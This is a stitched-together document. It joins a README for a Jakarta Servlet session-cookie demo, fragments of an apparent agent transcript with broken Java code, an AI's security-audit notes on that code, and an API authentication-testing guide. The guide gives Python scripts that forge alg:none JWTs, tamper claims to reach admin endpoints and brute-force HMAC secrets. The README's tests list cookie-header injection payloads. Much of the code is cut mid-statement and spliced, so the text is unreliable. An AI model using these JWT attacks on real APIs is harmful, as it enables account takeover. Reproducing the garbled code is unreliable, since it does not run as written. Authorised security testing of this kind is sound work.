Session cookie after authentication (Jakarta Servlet 6.0)\n\nA web application that, once a user has authenticated, mints a session identifier, stores the\nauthenticated state server side, and attaches a session cookie to the HTTP response so subsequent\nrequests from that browser are recognised as the same authenticated session.\n\nThe focus is the cookie's configuration. Most of the code exists to make the attributes on one\n`Set-Cookie` header correct, verifiable, and impossible to weaken by accident:\n\n```\nSet-Cookie: APPSESSION=K5Kw7LggCQtEduy_M8v6ocvpY04PoCkggCwqFtIlSoc; Path=/; Secure; HttpOnly; SameSite=Lax\n```\n\nRecorded from a real Tomcat 10.1.59 (`./smoke-test.sh`), not written by hand.\n\n## Cookie attributes and why each one\n\n| Attribute | Value | What it prevents |\n| --- | --- | --- |\n| value | 32 random bytes from `SecureRandom`, base64url, 43 chars | Guessable or enumerable sessions. Not derived from the username or a timestamp. |\n| `HttpOnly` | always set | A script injected into the page cannot read the identifier from `document.cookie`. |\n| `Secure` | always set | The identifier is never sent over plaintext HTTP, so not visible to a network observer or a downgraded link. |\n| `SameSite` | `Lax` (default) | Not attached to cross-site POSTs, which is what makes CSRF against a state-changing endpoint fail. `None` is refused unless `Secure` is also set. |\n| `Path` | `/` (the application root) | The identifier is not sent to unrelated paths, or to paths the same host serves for third parties. |\n| `Domain` | **never emitted** | Stays a host-only cookie. A `Domain` attribute lets every subdomain read *and plant* the session cookie. `SessionCookieConfig` has no domain setting at all, so this cannot be turned on. |\n| `Max-Age` / `Expires` | **absent** (`maxAgeSeconds = -1`) | Browser-session cookie: the identifier dies with the browser instead of persisting on a shared machine. Server-side expiry is enforced independently, so a cookie that somehow survives still stops working. |\n\nTwo further things are asserted at runtime rather than assumed:\n\n- The identifier is validated against `[A-Za-z0-9._~-]` (RFC 6265 `token` / RFC 4648 base64url)\n  *before* it reaches the header, so a value that came from outside cannot smuggle CR, LF, `;` or an\n  extra attribute into `Set-Cookie`. Rejection happens before the response is touched.\n- After `response.addCookie(...)`, the header the container actually produced is read back\n  (`SessionCookieIssuer.assertHeaderIntegrity`) and the request fails if the container dropped\n  `Secure`, `HttpOnly` or `Path`, or emitted a header containing a control character. A container that\n  silently ignores an attribute would otherwise hand out a cookie that looks set but is readable by\n  script or replayable over http.\n\nSession fixation is handled the same way it must be: login discards any session the request arrived\nwith and mints a *new* identifier, so a value an attacker fixed earlier never names an authenticated\nsession.\n\n## Layout\n\n```\nsrc/main/java/com/example/auth/\n  SessionCookieIssuer.java     builds the cookie, adds it to the response, verifies the header  <-- the core\n  SessionCookieConfig.java     immutable attribute set, validated invariants, context-param wiring\n  SessionIdentifier.java       validated opaque token; minting, constant-time compare, redaction\n  InMemorySessionStore.java    identifier -> authenticated state, with absolute expiry\n  AuthenticatedSession.java    SessionUser + minted-at + expires-at\n  AuthContextListener.java     creates store/issuer/config once, publishes them on ServletContext\n  LoginServlet.java            POST /api/login  - authenticates, sets the cookie\n  WhoAmIServlet.java           GET  /api/whoami - proves the cookie alone maintains the session\n  LogoutServlet.java           POST /api/logout - removes the session, overwrites the cookie\n  AuthenticatedSessionServlet.java  shared cookie-reading and JSON plumbing\n  SecurityHeadersFilter.java   no-store / Vary: Cookie / CSP / Referrer-Policy / HSTS-on-TLS\n  EnvironmentCredentialVerifier.java  PLACEHOLDER credential check - replace for production\n  CredentialVerifier.java      the seam to replace\n  Json.java                    response escaping\nsrc/main/webapp/\n  WEB-INF/web.xml              registration + cookie context-params + container session hardening\n  index.html, app.js, app.css  minimal form to exercise it in a browser\nsrc/test/java/com/example/auth/TestHarness.java   116 assertions, no test framework needed\nbuild.sh  run-tests.sh  smoke-test.sh\n```\n\nServlets, the filter and the listener are registered in `WEB-INF/web.xml` rather than by annotation,\nso the cookie settings and the container-side hardening sit together in one file that can be reviewed\nand diffed.\n\n## Compile and run\n\nRequires JDK 17+ and any Jakarta Servlet 6.0 API jar (Tomcat 10.1+ or Jetty 11+ supplies one at\nruntime; the API jar is only needed to compile). No Maven or Gradle is involved.\n\n```bash\n./build.sh          # compile and package build/session-cookie.war\n./run-tests.sh      # 116 assertions against Proxy doubles of the Servlet API\n./run-tests.sh --verbose\n```\n\n`build.sh` searches for the API jar (`jakarta.servlet-api-*.jar` or Tomcat's `lib/servlet-api.jar`,\nchecking inside the jar that it is the `jakarta.*` namespace and not `javax.*`). Point it explicitly\nwith `SERVLET_API_JAR=/path/to/jakarta.servlet-api-6.0.0.jar ./build.sh`, or drop the jar in `lib/`.\nIf you need to download it:\n\n```bash\nmkdir -p lib && curl -fLso lib/jakarta.servlet-api-6.0.0.jar \\\n  https://repo1.maven.org/maven2/jakarta/servlet/jakarta.servlet-api/6.0.0/jakarta.servlet-api-6.0.0.jar\n```\n\nEquivalent manual commands, with nothing assumed about the platform default charset (a box without\n`LANG`/`LC_ALL` defaults to US-ASCII, which is why `-encoding` is always explicit):\n\n```bash\njavac -Xlint:all -Werror -encoding UTF-8 -cp lib/jakarta.servlet-api-6.0.0.jar \\\n      -d build/classes $(find src/main/java -name '*.java')\nmkdir -p build/war/WEB-INF/classes\ncp -r build/classes/. build/war/WEB-INF/classes/\ncp -r src/main/webapp/. build/war/\n( cd build/war && jar --create --file ../session-cookie.war . )\n```\n\n### Deploy\n\nCopy the war into the container and start it. As `ROOT` the context path is `/`, which is what\n`cookiePath=/` in `web.xml` assumes; deploy it under a sub-path and set `cookiePath` to match, or the\nbrowser stops sending the cookie back.\n\n```bash\n# Tomcat 10.1+ / Jetty 11+\ncp build/session-cookie.war \"$CATALINA_HOME/webapps/ROOT.war\"\n\"$CATALINA_HOME/bin/catalina.sh\" run\n```\n\nThe demo verifier reads `demo.username` / `demo.password` system properties, or `DEMO_USERNAME` /\n`DEMO_PASSWORD` environment variables. Without them login deliberately returns\n`500 not_configured` rather than a plausible-looking `401` that would hide a broken deployment:\n\n```bash\nCATALINA_OPTS=\"-Ddemo.username=alice '-Ddemo.password=correct horse battery staple'\" \\\n  \"$CATALINA_HOME/bin/catalina.sh\" run\n```\n\nThen open `http://localhost:8080/` and watch the Network tab, or:\n\n```bash\ncurl -i -X POST --data-urlencode username=alice \\\n        --data-urlencode 'password=correct horse battery staple' \\\n        http://localhost:8080/api/login\n\ncurl -i -b 'APPSESSION=<value from Set-Cookie>' http://localhost:8080/api/whoami\n\ncurl -i -X POST -b 'APPSESSION=<value>' http://localhost:8080/api/logout\n```\n\n`./smoke-test.sh` does all of that against a throwaway Tomcat instance (its own `CATALINA_BASE` under\n`build/`, its own ports, stopped on exit) and asserts on the headers that come off the wire. It exits\n77 with a `SKIP` when no Tomcat 10.1+ install is present or the port is busy. Override with\n`TOMCAT_HOME=/opt/tomcat PORT=8099 ./smoke-test.sh`.\n\n### Endpoints\n\n| Method | Path | Behaviour |\n| --- | --- | --- |\n| `POST` | `/api/login` | `username`/`password` form params. `200` + `Set-Cookie` on success, `401` with no cookie on failure, `500` if the verifier is unconfigured. `405` for `GET`. |\n| `GET` | `/api/whoami` | `200` with the principal when the cookie names a live session, else `401`. |\n| `POST` | `/api/logout` | `204` always. Removes the session server side and overwrites the cookie (`Max-Age=0`, same name and `Path`). `405` for `GET`, so a stray link cannot log anyone out. |\n\n## Configuration\n\nAll `context-param` values in `WEB-INF/web.xml`, read once by `AuthContextListener`:\n\n| Parameter | Default | Notes |\n| --- | --- | --- |\n| `cookieName` | `APPSESSION` | Must be an RFC 6265 token. |\n| `cookiePath` | `/` | Must be absolute; set to the deployment's context path. |\n| `secureCookie` | `true` | Set to `false` only to debug over plain http on localhost. |\n| `httpOnlyCookie` | `true` | Turning this off makes the cookie readable by any script on the origin. |\n| `sameSite` | `Lax` | `Strict`, `Lax`, `None`. `None` without `Secure` throws at start-up. |\n| `maxAgeSeconds` | `-1` | `-1` browser session, `0` delete-now (used by logout), positive for a persistent cookie. |\n| `sessionTtlMinutes` | `30` | Server-side deadline, independent of the cookie's lifetime. Keep at or below the `session-config` timeout. |\n\n`SessionCookieConfig`'s constructor rejects a relative path, a cookie name containing a separator or\nwhitespace, `SameSite=None` without `Secure`, and a nonsensical negative lifetime - so a\nmisconfiguration surfaces as a failed start-up, not as a weak cookie served silently.\n\n## What this is not, and what to change before production\n\n- **`EnvironmentCredentialVerifier` is a placeholder.** One credential from a system property, no\n  user store, no salted password hash, no lockout or rate limiting. Replace it by publishing a\n  different `CredentialVerifier` in `AuthContextListener`; nothing else needs to change. Comparisons\n  are constant-time (`MessageDigest.isEqual`) so the placeholder is at least not a password oracle.\n- **`InMemorySessionStore` is single-JVM and non-durable.** Restarting logs everyone out; it will not\n  survive a second node. Swap in a shared store (Redis, a database table) behind the same surface, and\n  keep the constant-time comparison and the absolute deadline.\n- **No CSRF token.** `SameSite=Lax` blocks the cross-site POST case, which is why the state-changing\n  endpoints are POST-only. A login form is not CSRF-protected here, so adding an explicit\n  synchroniser token (or `fetch` with a custom header) is the next step.\n- **No HTTPS configuration.** `Secure` is emitted on the cookie, but TLS, the redirect from http, and\n  HSTS preload belong to the deployment. HSTS is only sent when `request.isSecure()` is true.\n- **The store keys on the identifier.** A store that instead looked up a *user* by an identifier would\n  need the constant-time comparison on the lookup path; `SessionIdentifier#matches` exists so that\n  call site has something correct to use.\n- Session identifiers are never logged in full (`describe()` redacts to a 4/4-character fingerprint)\n  and never echoed in a response body - login returns a SHA-256 fingerprint instead, since anything\n  that can read the body can also be script on the origin, which is what `HttpOnly` is there to stop.\n\n## How this was verified\n\n- `./run-tests.sh` - 116 assertions over `java.lang.reflect.Proxy` doubles of the Servlet API. The\n  response double renders `addCookie` the way an RFC 6265 cookie processor does, so checks assert on\n  emitted header text. Covers the attribute set, header integrity (including a simulated container\n  that drops `Secure` or emits a CRLF), identifier rejection of 14 crafted payloads\n  (`abc; Domain=attacker.example`, `abc\\r\\nSet-Cookie: admin=y`, NUL, U+0085, oversize, ...),\n  uniqueness across 2000 minted values, the store lifecycle, fixation, and every endpoint's\n  success/anon/tampered/crafted/duplicate/expired paths.\n- `./smoke-test.sh` - the same properties against real Tomcat 10.1.59, asserting on `curl -D -`\n  output: `HttpOnly`, `Secure`, `SameSite=Lax`, `Path=/`, no `Domain`, no `Max-Age`, no second\n  `JSESSIONID`, 43-character identifier, cookie-only re-authentication, tamper/craft rejection,\n  logout clearing, replay-after-logout rejection, and `WEB-INF` not reachable over HTTP.\n- Both compile clean under `javac -Xlint:all -Werror`.\n- Mutation-checked: 11 deliberate defects (drop `HttpOnly`, drop `Secure`, allow `SameSite=None`\n  without `Secure`, unpin `Path`, remove identifier validation, shorten minted identifiers, keep the\n  pre-authentication identifier, never attach the cookie, first-duplicate-wins, ignore the expiry\n  deadline, remove the header assertion) were each applied to a throwaway copy of the tree; all 11\n  were caught by a failing check, and removing `addCookie` additionally trips the fail-closed\n  assertion.\n\nCompiling against the real `jakarta.servlet-api` jar and then running the war on Tomcat matters here\nfor one specific reason: `SameSite` is only reachable through `Cookie#setAttribute(\"SameSite\", ...)`,\na Servlet 6.0 API, and whether it reaches the wire depends on the container's cookie processor. The\n`Set-Cookie` header above is Tomcat's own output.\n"}]}},{"type":"user","uuid":"a24c3112-5dc7-42c2-96b3-10a3fc87bacd","session_id":"e79bbd64-8af9-4f62-aed6-c8de0d34dc28","parent_tool_use_id":null,"message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"call_73600aac63b4497088d40c7f","is_error":false,"content":"package com.example.auth;\n\nimport jakarta.servlet.ServletException;\nimport jakarta.servlet.annotation.WebServlet;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.util.Optional;\n\n/**\n * Establishes the authenticated session and attaches the session cookie to the response. <p>What happens on a successful credential check, in order:\n *\n * <ol>\n *   <li>Any session the request already carried is dropped, so the pre-authentication identifier\n *       cannot survive into the authenticated state (session fixation).</li>\n *   <li>A fresh 256-bit identifier is minted and bound to the principal in the store.</li>\n *   <li>The cookie is built with {@code HttpOnly}, hardened and\n * URL rewriting is switched off.\n */\npublic final class LoginServlet extends AuthenticatedSessionServlet {\n\n    private static final long serialVersionUID = 1L;\n\n    @Override\n (!verifier.isConfigured()) {\n            // A missing verifier must not read as \"wrong password\": that would hide a broken\n            // deployment behind a plausible 401 forever.\n            respondError(response, HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"not_configured\",\n                    \"credential verifier has no credentials configured\");\n            return;\n        }\n\n        Optional<SessionUser> principal;\n        try {\n            principal = verifier.verify(username, password);\n        } catch (RuntimeException failure) {\n            // Upstream detail stays in the log: a 401 body is a good place to leak why.\n            log(\"credential verification failed\", failure);\n            respondError(response, HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"verification_error\",\n                    \"credential verification could not be completed\");\n            return;\n        }\n\n        if (principal.isEmpty()) {\n            respondError(response, HttpServletResponse.SC_UNAUTHORIZED, \"invalid_credentials\",\n                    \"username or password is not correct\");\n store().create(principal.get(), ttl());\n\n        // The line that matters: the identifier goes into a Set-Cookie header on this response.\n        SessionCookieIssuer issuer = issuer();\n        issuer.issue(response, session.identifier());\n\n        log(\"authenticated \" + principal.get().username() + \" as session \" + session.identifier().describe());\n        // The body reports a redacted fingerprint, never the identifier itself. Repeating it here\n        // would hand the credential to anything that can read the response body - including script\n        // running in the page, which is the whole reason the cookie is HttpOnly. Swap in the real verifier by replacing the {@link CredentialVerifier} published by\n * {@code AuthContextListener}; nothing else has to change. Comparisons here are constant time so the\n * placeholder is at least not an oracle for the password, which also makes it useful as a stand-in\n * double when testing the session path.\n */\npublic final class EnvironmentCredentialVerifier implements CredentialVerifier {\n\n    private static final String USER_PROPERTY = \"demo.username\";\n    private static final String PASSWORD_PROPERTY = \"demo.password\";\n\n    @Override\n    public Optional<SessionUser> verify(String username, String password) {\n        if (!isConfigured()) {\n            throw new IllegalStateException(\n                    \"no credentials configured: set -D\" + USER_PROPERTY + \"=-D\" + PASSWORD_PROPERTY\n                            + \" or the DEMO_USERNAME / DEMO_PASSWORD environment variables\");\n        }\n        if (username == null || password == null) {\n            return Optional.empty();\n        }\n        boolean userMatches = constantTimeEquals(expectedUser(), username);\n        boolean passwordMatches = constantTimeEquals(expectedPassword(), password);\n        return userMatches && passwordMatches ? The attributes that matter are set explicitly rather than left to\n * container or framework defaults:\n *\n * <ul>\n *   <li>{@code HttpOnly} - the cookie is invisible to {@code document.cookie}, so an injected script\n *       cannot read the identifier.</li>\n *   <li>{@code Secure} - never sent over plaintext HTTP, hence never exposed to a network observer\n *       or a downgraded link.</li>\n *   <li>{@code SameSite=Lax} - not attached to cross-site POSTs, which blocks the classic\n *       cross-site request forgery against a state-changing endpoint.</li>\n *   <li>No {@code Domain} attribute - the cookie stays host-only, so a sibling subdomain cannot read\n *       or plant it.</li>\n *   <li>{@code Path} pinned to the application root - the identifier is not sent to unrelated paths\n *       or to paths a host also serves for third parties (user-content directories on a UGC host are\n *       the usual way this leaks).</li>\n *   <li>Browser-session lifetime by default: no {@code Max-Age}/{@code Expires}, so the identifier\n *       disappears when the browser closes instead of lingering on a shared machine.</li>\n * </ul>\n *\n * <p>The identifier itself is validated by {@link SessionIdentifier.of(String)} before it reaches\n * the header, so a value that arrived from outside cannot smuggle CR/LF or an extra attribute into\n * {@code Set-Cookie}. Nothing here ever calls\n * {@code request.getSession()}, so no second cookie ({@code JSESSIONID}) is ever minted and a request\n * never carries two identities that can disagree - verified in both {@code TestHarness} and\n * {@code smoke-test.sh}. {@code web.xml} additionally marks the container session cookie HttpOnly and\n * Secure and sets {@code tracking-mode=\"COOKIE\"}, so if some library does ask for a container session\n * it cannot leak its identifier into a URL.\n *\n * <p>Single-JVM and non-durable: restarting the application logs everyone out, and it does not scale\n * horizontally. Not a finding.\n\n23. **ConcurrentModification**: `sessions.values().removeIf` on ConcurrentHashMap — safe.\n\n24. **`LoginServlet` — `store().remove(presented)` before creating new.** If the presented identifier is an *attacker's* live session id... An unauthenticated attacker can send `Cookie: APPSESSION=<victim's session>` and successfully log in with their own credentials → this would DELETE the victim's session (forced logout). That's a minor DoS. Requires knowing victim's session id though. Low. Actually presented is attacker-supplied; they'd have to know a valid session identifier to remove it, which they can't. So not exploitable. Skip.\n\n25. **`whoami` has no `Cache-Control` issue** — respondJson sets no-store. Good.\n\n26. **CSP does not include `frame-ancestors` explicitly** and no X-Frame-Options → clickjacking on the login page. Combined with login CSRF. Report Low.\n\n27. **`autocomplete=\"username\"` on username input and `autocomplete=\"current-password\"`** — index.html has `autocomplete=\"off\"` on the form but inputs override. Minor. Not worth.\n\n28. **web.xml `tracking-mode COOKIE`** — good (prevents URL rewriting → session id in URL, CWE-598). Good control.\n\n29. **No `<transport-guarantee>CONFIDENTIAL</transport-guarantee>` / user-data-constraint in web.xml** → the app doesn't enforce TLS at container level. Combined with the fact that README says \"No HTTPS configuration\". `Secure` cookie emitted, but if the user first visits over http, everything is in the clear. Also the welcome page index.html served over http, login POST over http → credentials in plaintext. That's CWE-319 (Cleartext Transmission of Sensitive Information). HSTS only when isSecure(). And no http→https redirect. The login form POSTs credentials; nothing enforces TLS. This is a real High finding: the app as shipped will happily accept credentials over plaintext HTTP. Report as High/Medium with CWE-319. Evidence: web.xml lacks `<user-data-constraint><transport-guarantee>CONFIDENTIAL`; SecurityHeadersFilter line only sets HSTS conditionally.\n\nLet me weigh: The README explicitly acknowledges \"No HTTPS configuration... belong to the deployment\". Still a legitimate finding to report — severity High given credentials transit.\n\n30. **`EnvironmentCredentialVerifier` compares plaintext password read from env** — no hashing (CWE-257 / CWE-256). Documented placeholder.\n\n31. **Timing**: `userMatches` and `passwordMatches` both computed → no early exit. Good. But `MessageDigest.isEqual` on UTF-8 bytes of differing lengths still is fine.\n\nHmm one more: `constantTimeEquals(expectedUser(), username)` — MessageDigest.isEqual in modern JDKs is constant-time-ish but leaks length? JDK's isEqual compares lengths and does a timing-safe loop over min length then checks length equality. It's considered non-leaky enough. Not a finding.\n\n32. **`assertHeaderIntegrity`** — `hasBooleanAttribute(header, \"Secure\")`. `header.split(\";\")` then `part.trim().equalsIgnoreCase(attribute)`. Note `String.split` with regex \";\" — fine. Potential bypass: if container renders `Secure` inside quotes? Not realistic.\n\nHmm, but there IS a subtle bug: `hasAttributeWithPrefix(header, \"Path=\")` uses `regionMatches` on trimmed part — a cookie value could contain \"Path=\" if... no, split on \";\" splits it. Actually consider `Set-Cookie: APPSESSION=xPath=y; Path=/`. split → [\"APPSESSION=xPath=y\", \" Path=/\"]. Fine. What if the value itself were `x;Path=/` — the container would quote it. And SessionIdentifier forbids ';'. OK.\n\n33. **`LogoutServlet`**: calls `issuer().expire(response)` unconditionally → sets a cookie with empty value + Max-Age=0. `build(\"\", expiring)` → `new Cookie(name, \"\")`. Does Tomcat accept empty cookie value? Tomcat may reject empty value and log, but with RFC 6265 the empty value is a valid cookie-value. If the container refuses to emit `Set-Cookie` for an empty value, `assertHeaderIntegrity` throws IllegalStateException → 500 on logout. Hmm. That's functional, and it fails closed. Also `expire()` uses `maxAgeSeconds(0)`. And `assertHeaderIntegrity` requires `Path=` — fine.\n\nBut note: `expire()` sets Secure/HttpOnly from config; if secure=false... fine.\n\nHmm, potential issue: in `expire()`, `assertHeaderIntegrity` requires the header to exist. If container skips empty-value cookies... test says it works on Tomcat. Fine.\n\n34. **`LoginServlet` unused import `WebServlet`** — code quality, not security.\n\n35. **TestHarness** — let me skim for hardcoded creds.\n\n36. **`whoami` returns `sessionFingerprint`** — computed with SHA-256 of identifier; if an attacker can obtain the fingerprint they can't invert. OK.\n\n37. **`InMemorySessionStore.findLive`** — calls `SessionIdentifier.of(rawIdentifier)` which throws IAE for illegal chars → returns empty. Good. But `remove()` bypasses validation. Not a vuln.\n\n38. **Session ID not bound to user agent / IP** — optional hardening. Skip.\n\n39. **Missing `SameSite` check in assertHeaderIntegrity** — it checks Secure/HttpOnly/Path but NOT SameSite. If container drops SameSite (older container that doesn't support `setAttribute(\"SameSite\")` — which is exactly the Servlet 6.0 concern the README raises!), the cookie ships without SameSite → defaults to `Lax` in modern browsers, but in older browsers, no SameSite = sent on cross-site requests (None-equivalent) → CSRF. The README emphasizes the container may silently drop attributes and asserts on 3 of them, but omits SameSite. That's a genuine gap worth reporting as a Medium finding (CWE-1021 / CWE-1275?). Hmm — \"Cookie without SameSite attribute\" is CWE-1275. Let me think about severity. Given the app's explicit design goal is header integrity verification and it deliberately relies on SameSite=Lax as its *only* CSRF defense, a dropped SameSite silently removing CSRF protection is a real gap. Medium.\n\nActually let's be careful and accurate: is it a finding? Maps to OWASP API2:2023 Broken\n  Authentication. Activates for requests involving API authentication testing, token\n  validation assessment, credential security testing, or API auth bypass.\n\n  '\ndomain: cybersecurity\nsubdomain: api-security\ntags:\n- api-security\n- owasp\n- authentication\n- jwt\n- session-management\n- credential-security\nversion: 1.0.0\nauthor: mahipal\nlicense: Apache-2.0\nnist_csf:\n- PR.PS-01\n- ID.RA-01\n- PR.DS-10\n- DE.CM-01\nmitre_attack:\n- T1190\n- T1059.007\n- T1552.001\n- T1003\n- T1110\n---\n# Testing API Authentication Weaknesses\n\n## When to Use\n\n- Assessing REST API authentication mechanisms for bypass vulnerabilities before production deployment\n- Testing JWT token implementation for common weaknesses (none algorithm, key confusion, missing expiration)\n- Evaluating whether all API endpoints enforce authentication or if some are unintentionally exposed\n- Testing API key generation, storage, and rotation mechanisms for predictability or leakage\n- Validating session management including token expiration, revocation, and refresh token security\n\n**Do not use** without written authorization. Authentication testing involves attempting to bypass security controls.\n\n## Prerequisites\n\n- Written authorization specifying target API and authentication mechanisms in scope\n- Valid test credentials for at least two user roles (regular user, admin)\n- Burp Suite Professional with JWT-related extensions (JSON Web Tokens, JWT Editor)\n- Python 3.10+ with `requests`, `PyJWT`, and `jwt` libraries\n- Wordlists for credential testing (SecLists authentication wordlists)\n- API documentation or OpenAPI specification\n\n## Workflow\n\n### Step 1: Authentication Mechanism Identification\n\n```python\nimport requests\nimport json\n\nBASE_URL = \"https://target-api.example.com/api/v1\"\n\n# Probe the API to identify authentication mechanisms\nauth_indicators = {\n    \"jwt_bearer\": False,\n    \"api_key_header\": False,\n    \"api_key_query\": False,\n    \"basic_auth\": False,\n    \"oauth2\": False,\n    \"session_cookie\": False,\n    \"custom_token\": False,\n}\n\n# Test 1: Check unauthenticated access\nresp = requests.get(f\"{BASE_URL}/users/me\")\nprint(f\"Unauthenticated: {resp.status_code}\")\nif resp.status_code == 200:\n    print(\"[CRITICAL] Endpoint accessible without authentication\")\n\n# Test 2: Check WWW-Authenticate header\nif \"WWW-Authenticate\" in resp.headers:\n    scheme = resp.headers[\"WWW-Authenticate\"]\n    print(f\"Auth scheme advertised: {scheme}\")\n    if \"Bearer\" in scheme:\n        auth_indicators[\"jwt_bearer\"] = True\n    elif \"Basic\" in scheme:\n        auth_indicators[\"basic_auth\"] = True\n\n# Test 3: Login and examine tokens\nlogin_resp = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": \"testuser@example.com\", \"password\": \"TestPass123!\"})\n\nif login_resp.status_code == 200:\n    login_data = login_resp.json()\n    # Check for JWT tokens\n    for key in [\"token\", \"access_token\", \"jwt\", \"id_token\"]:\n        if key in login_data:\n            token = login_data[key]\n            if token.count('.') == 2:\n                auth_indicators[\"jwt_bearer\"] = True\n                print(f\"JWT found in response field: {key}\")\n    # Check for refresh tokens\n    for key in [\"refresh_token\", \"refresh\"]:\n        if key in login_data:\n            print(f\"Refresh token found in field: {key}\")\n    # Check for session cookies\n    for cookie in login_resp.cookies:\n        print(f\"Cookie set: {cookie.name} = {cookie.value[:20]}...\")\n        if \"session\" in cookie.name.lower():\n            auth_indicators[\"session_cookie\"] = True\n\nprint(f\"\\nAuthentication mechanisms detected: {[k for k,v in auth_indicators.items() if v]}\")\n```\n\n### Step 2: Unauthenticated Endpoint Discovery\n\n```python\n# Test all endpoints without authentication\nendpoints = [\n    (\"GET\", \"/users\"),\n    (\"GET\", \"/users/me\"),\n    (\"GET\", \"/users/1\"),\n    (\"GET\", \"/admin/users\"),\n    (\"GET\", \"/admin/settings\"),\n    (\"GET\", \"/health\"),\n    (\"GET\", \"/metrics\"),\n    (\"GET\", \"/debug\"),\n    (\"GET\", \"/actuator\"),\n    (\"GET\", \"/actuator/env\"),\n    (\"GET\", \"/swagger.json\"),\n    (\"GET\", \"/api-docs\"),\n    (\"GET\", \"/graphql\"),\n    (\"POST\", \"/graphql\"),\n    (\"GET\", \"/config\"),\n    (\"GET\", \"/internal/status\"),\n    (\"GET\", \"/.env\"),\n    (\"GET\", \"/status\"),\n    (\"GET\", \"/info\"),\n    (\"GET\", \"/version\"),\n]\n\nprint(\"Unauthenticated Endpoint Scan:\")\nfor method, path in endpoints:\n    try:\n        resp = requests.request(method, f\"{BASE_URL}{path}\", timeout=5)\n        if resp.status_code not in (401, 403):\n            content_preview = resp.text[:100] if resp.text else \"empty\"\n            print(f\"  [OPEN] {method} {path} -> {resp.status_code}: {content_preview}\")\n    except requests.exceptions.RequestException:\n        pass\n```\n\n### Step 3: JWT Token Analysis\n\n```python\nimport base64\nimport json\nimport hmac\nimport hashlib\n\ndef decode_jwt_parts(token):\n    \"\"\"Decode JWT header and payload without verification.\"\"\"\n    parts = token.split('.')\n    if len(parts) != 3:\n        return None, None\n\n    def pad_base64(s):\n        return s + '=' * (4 - len(s) % 4)\n\n    header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])))\n    payload = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])))\n    return header, payload\n\n# Analyze the JWT token\ntoken = login_data.get(\"access_token\", \"\")\nheader, payload = decode_jwt_parts(token)\n\nprint(f\"JWT Header: {json.dumps(header, indent=2)}\")\nprint(f\"JWT Payload: {json.dumps(payload, indent=2)}\")\n\n# Security checks\nissues = []\n\n# Check 1: Algorithm\nif header.get(\"alg\") == \"none\":\n    issues.append(\"CRITICAL: Algorithm set to 'none' - token signature not verified\")\nif header.get(\"alg\") in (\"HS256\", \"HS384\", \"HS512\"):\n    issues.append(\"INFO: Symmetric algorithm used - check for weak/default secrets\")\n\n# Check 2: Expiration\nif \"exp\" not in payload:\n    issues.append(\"HIGH: No expiration claim (exp) - token never expires\")\nelse:\n    import time\n    exp_time = payload[\"exp\"]\n    ttl = exp_time - time.time()\n    if ttl > 86400:\n        issues.append(f\"MEDIUM: Token TTL is {ttl/3600:.0f} hours - excessively long\")\n\n# Check 3: Sensitive data in payload\nsensitive_fields = [\"password\", \"ssn\", \"credit_card\", \"secret\", \"private_key\"]\nfor field in sensitive_fields:\n    if field in payload:\n        issues.append(f\"HIGH: Sensitive field '{field}' in JWT payload\")\n\n# Check 4: Missing claims\nexpected_claims = [\"iss\", \"aud\", \"exp\", \"iat\", \"sub\"]\nmissing = [c for c in expected_claims if c not in payload]\nif missing:\n    issues.append(f\"MEDIUM: Missing standard claims: {missing}\")\n\n# Check 5: Key ID\nif \"kid\" in header:\n    kid = header[\"kid\"]\n    # Test for path traversal in kid\n    issues.append(f\"INFO: Key ID (kid) present: {kid} - test for injection\")\n\nfor issue in issues:\n    print(f\"  [{issue.split(':')[0]}] {issue}\")\n```\n\n### Step 4: JWT Manipulation Attacks\n\n```python\n# Attack 1: Remove signature (alg: none)\ndef forge_none_algorithm(token):\n    \"\"\"Create a token with alg:none to bypass signature verification.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    header['alg'] = 'none'\n    new_header = base64.urlsafe_b64encode(\n        json.dumps(header).encode()).decode().rstrip('=')\n    # Variations of the none algorithm\n    return [\n        f\"{new_header}.{parts[1]}.\",\n        f\"{new_header}.{parts[1]}.{parts[2]}\",\n        f\"{new_header}.{parts[1]}.e30\",\n    ]\n\n# Attack 2: Modify claims without re-signing\ndef forge_payload(token, modifications):\n    \"\"\"Modify payload claims and test if server validates signature.\"\"\"\n    parts = token.split('.')\n    payload = JWTs.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    if header.get('alg') not in ('HS256', 'HS384', 'HS512'):\n        print(\"Not an HMAC token, skipping brute force\")\n        return None\n\n    signing_input = f\"{parts[0]}.{parts[1]}\".encode()\n    signature = parts[2]\n\n    hash_func = {\n        'HS256': hashlib.sha256,\n        'HS384': hashlib.sha384,\n        'HS512': hashlib.sha512\n    }[header['alg']]\n\n    for secret in COMMON_JWT_SECRETS:\n        expected_sig = base64.urlsafe_b64encode(\n            hmac.new(secret.encode(), signing_input, hash_func).digest()\n        ).decode().rstrip('=')\n        if expected_sig == signature:\n            print(f\"[CRITICAL] JWT secret found: '{secret}'\")\n \"is_admin\": True})\nresp = requests.get(f\"{BASE_URL}/admin/users\",\n                   headers={\"Authorization\": f\"Bearer {admin_token}\"})\nif resp.status_code == 200:\n    print(\"[CRITICAL] Authentication** | OWASP API2:2023 - weaknesses in authentication mechanisms that allow attackers to assume identities of legitimate users |\n| **JWT (JSON Web Token)** | Self-contained token format with header.payload.signature structure, used for stateless API authentication |\n| **Token Revocation** | Server-side mechanism to invalidate tokens before their expiration, critical for logout and password change |\n| **Credential Stuffing** | Automated attack using leaked username/password pairs against authentication endpoints |\n| **Account Enumeration** | Determining valid usernames through different error messages or response times for valid vs invalid accounts |\n| **Refresh Token Rotation** | Security practice where each use of a refresh token generates a new one, preventing token reuse attacks |\n\n## Tools & Systems\n\n- **Burp Suite JWT Editor**: Extension for decoding, editing, and re-signing JWT tokens with various attack modes\n- **jwt_tool**: Python tool for JWT testing with 12+ attack modes including alg:none, key confusion, and JWKS spoofing\n- **hashcat**: GPU-accelerated password cracker supporting JWT HMAC secret brute-forcing (mode 16500)\n- **Hydra**: Network login brute-forcer supporting HTTP form-based and API authentication testing\n- **Nuclei**: Template-based scanner with authentication bypass detection templates\n\n## Common Scenarios\n\n### Scenario: 